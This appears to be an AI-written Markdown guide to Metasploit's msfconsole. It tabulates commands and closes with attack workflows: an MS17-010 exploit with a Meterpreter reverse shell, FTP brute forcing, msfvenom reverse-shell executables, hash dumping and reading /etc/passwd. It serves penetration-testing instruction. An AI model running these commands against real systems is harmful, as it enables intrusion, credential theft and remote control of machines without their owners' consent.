# msfconsole-use
Here’s a **comprehensive guide** to using `msfconsole` in Metasploit, including its help options and examples.

---

## **Launching msfconsole**
```bash
msfconsole
```

Once inside, you can access the help menu by typing:
```bash
help
```
or:
```bash
? 
```

This will display a list of commands available in the Metasploit console.

---

## **Key msfconsole Commands**
### General Commands
| Command         | Description                                                                                      | Example                               |
|------------------|--------------------------------------------------------------------------------------------------|---------------------------------------|
| `banner`        | Displays a random Metasploit banner.                                                             | `banner`                              |
| `version`       | Displays the Metasploit Framework version.                                                       | `version`                             |
| `history`       | Shows command history.                                                                           | `history`                             |
| `sessions`      | Lists all active sessions.                                                                       | `sessions -i 1`                       |
| `exit`          | Exits the console.                                                                               | `exit`                                |

---

### Searching Modules
| Command         | Description                                                                                      | Example                               |
|------------------|--------------------------------------------------------------------------------------------------|---------------------------------------|
| `search`        | Searches for a specific exploit, payload, or auxiliary module.                                   | `search smb`                          |
| `info`          | Displays detailed information about a specific module.                                           | `info exploit/windows/smb/ms17_010`   |

---

### Using Modules
| Command         | Description                                                                                      | Example                               |
|------------------|--------------------------------------------------------------------------------------------------|---------------------------------------|
| `use`           | Selects a specific module for use.                                                               | `use exploit/windows/smb/ms17_010`    |
| `show`          | Displays available payloads, targets, options, or modules.                                       | `show payloads`                       |
| `set`           | Configures an option for the selected module.                                                    | `set RHOSTS 192.168.1.10`             |
| `unset`         | Clears a set option.                                                                             | `unset RHOSTS`                        |
| `exploit`       | Executes the selected module.                                                                    | `exploit`                             |
| `run`           | Alias for `exploit`.                                                                             | `run`                                 |

---

### Payload Management
| Command         | Description                                                                                      | Example                               |
|------------------|--------------------------------------------------------------------------------------------------|---------------------------------------|
| `generate`      | Creates a payload.                                                                               | `generate -t exe -p windows/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444` |
| `msfvenom`      | Used to craft custom payloads outside of msfconsole.                                             | `msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f exe > shell.exe` |

---

### Auxiliary Modules
| Command         | Description                                                                                      | Example                               |
|------------------|--------------------------------------------------------------------------------------------------|---------------------------------------|
| `use`           | Select an auxiliary module.                                                                      | `use auxiliary/scanner/ftp/ftp_login` |
| `run`           | Execute the auxiliary module.                                                                    | `run`                                 |

---

### Managing Exploits and Sessions
| Command         | Description                                                                                      | Example                               |
|------------------|--------------------------------------------------------------------------------------------------|---------------------------------------|
| `jobs`          | Lists running jobs (background tasks).                                                           | `jobs`                                |
| `kill`          | Terminates a specific job.                                                                       | `kill 1`                              |
| `sessions`      | Interact with active sessions.                                                                   | `sessions -i 1`                       |
| `background`    | Backgrounds an active session.                                                                   | `background`                          |

---

### Post-Exploitation
| Command         | Description                                                                                      | Example                               |
|------------------|--------------------------------------------------------------------------------------------------|---------------------------------------|
| `use`           | Select a post-exploitation module.                                                               | `use post/windows/gather/hashdump`    |
| `set`           | Configure options for the module.                                                                | `set SESSION 1`                       |
| `run`           | Execute the post-exploitation module.                                                            | `run`                                 |

---

### Networking
| Command         | Description                                                                                      | Example                               |
|------------------|--------------------------------------------------------------------------------------------------|---------------------------------------|
| `route`         | Manage routing for pivoting.                                                                     | `route add 192.168.2.0/24 1`          |
| `arp`           | View or modify the ARP cache.                                                                    | `arp -a`                              |

---

### Database Management
| Command         | Description                                                                                      | Example                               |
|------------------|--------------------------------------------------------------------------------------------------|---------------------------------------|
| `db_status`     | Check the status of the database.                                                                | `db_status`                           |
| `workspace`     | Manage multiple workspaces.                                                                      | `workspace add test_workspace`        |
| `hosts`         | List discovered hosts.                                                                           | `hosts`                               |
| `services`      | List services discovered during scans.                                                           | `services`                            |

---

### Meterpreter-Specific Commands
| Command         | Description                                                                                      | Example                               |
|------------------|--------------------------------------------------------------------------------------------------|---------------------------------------|
| `getuid`        | Shows the user ID of the current session.                                                        | `getuid`                              |
| `sysinfo`       | Displays system information of the target.                                                       | `sysinfo`                             |
| `download`      | Downloads a file from the target system.                                                         | `download /etc/passwd`                |
| `upload`        | Uploads a file to the target system.                                                             | `upload shell.exe`                    |
| `shell`         | Drops to a command shell on the target.                                                          | `shell`                               |
| `exit`          | Exits the Meterpreter session.                                                                   | `exit`                                |

---

### Examples of Common Workflows
1. **Exploit SMB Vulnerability (MS17-010)**
   ```bash
   use exploit/windows/smb/ms17_010
   set RHOSTS 192.168.1.100
   set LHOST 192.168.1.10
   set PAYLOAD windows/meterpreter/reverse_tcp
   exploit
   ```

2. **Run an FTP Brute Force Attack**
   ```bash
   use auxiliary/scanner/ftp/ftp_login
   set RHOSTS 192.168.1.0/24
   set USER_FILE /usr/share/wordlists/usernames.txt
   set PASS_FILE /usr/share/wordlists/passwords.txt
   run
   ```

3. **Create a Reverse Shell Payload**
   ```bash
   msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f exe > reverse_shell.exe
   ```

4. **Post-Exploitation: Dump Password Hashes**
   ```bash
   use post/windows/gather/hashdump
   set SESSION 1
   run
   ```

---

### Additional Tips
- Use `help <command>` for more details on any command.
  ```bash
  help search
  ```
- To save progress or configurations:
  ```bash
  save
  ```
- Always update Metasploit to stay current:
  ```bash
  msfupdate
  ```

Let me know if you'd like further clarification or a deeper dive into any specific commands or workflows!
